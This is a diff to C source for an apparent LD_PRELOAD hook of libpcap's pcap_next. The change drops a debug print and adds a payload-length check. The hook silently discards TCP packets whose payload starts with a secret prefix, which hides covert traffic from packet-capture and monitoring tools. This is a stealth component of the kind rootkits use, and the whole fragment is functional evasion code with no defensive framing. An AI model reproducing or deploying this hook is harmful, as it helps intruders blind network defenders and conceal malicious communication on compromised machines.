@@ -14,8 +14,9 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
 {
     u_char *packet;
     u_char *payload;
+    u_int payload_len;
+
     struct tcphdr *tcp_hdr;
-    printf("WRAPPED\n");
     if (!og_pacp_next)
     {
         og_pacp_next = dlsym(RTLD_NEXT, "pcap_next");
@@ -27,17 +28,21 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
     }
     packet = og_pacp_next(p, h);
 
-    if (!(tcp_hdr = find_tcp_segment(packet, h->len)))
+    if (!(tcp_hdr = find_tcp_segment(packet, h->len))) 
+    {
         // Not TCP
         return packet;
+    }
 
     if (!(payload = get_tcp_payload(tcp_hdr)))
         // Couldn't extract payload
         return packet;
 
-    if (strncmp((char *)payload, secret_prefix, packet + h->len - payload) == 0)
+    payload_len = packet + h->len - payload;
+    if (payload_len && strncmp((char *)payload, secret_prefix, payload_len) == 0) {
         // Secret message found
         return pcap_next(p, h);
+    }
 
     return packet;
 
